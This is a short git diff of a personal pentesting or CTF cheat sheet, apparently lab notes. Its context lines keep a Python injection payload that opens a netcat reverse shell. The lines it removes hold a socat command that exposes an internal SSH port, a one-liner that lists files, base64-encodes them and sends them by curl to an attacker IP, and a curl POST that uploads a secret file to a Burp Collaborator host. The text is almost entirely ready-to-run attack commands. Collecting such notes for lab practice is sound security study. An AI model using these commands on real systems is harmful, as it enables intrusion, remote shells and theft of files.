@@ -287,18 +287,3 @@ In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the p
 If able to inject some python script, e.g. into unsanitised input, this can work:
 
 `__import__('os').popen('nc 10.10.106.5 4444 -e /bin/sh').read()`
-
-## Other stuff
-
-this will expose an internal only port 22 as a public port 8888
-
-`/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22`
-
-this will exfiltrate command outputs if all you have is the ability to make web requests:
-
-`ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`
-
-if you have a server or burp collaborator-like functionality, you can retrieve posted files via:
-
-`curl -X POST -F test=@/home/carlos/secret http://pohwe4zygesamfa7r5y0nutip9v1jq.burpcollaborator.net`
-
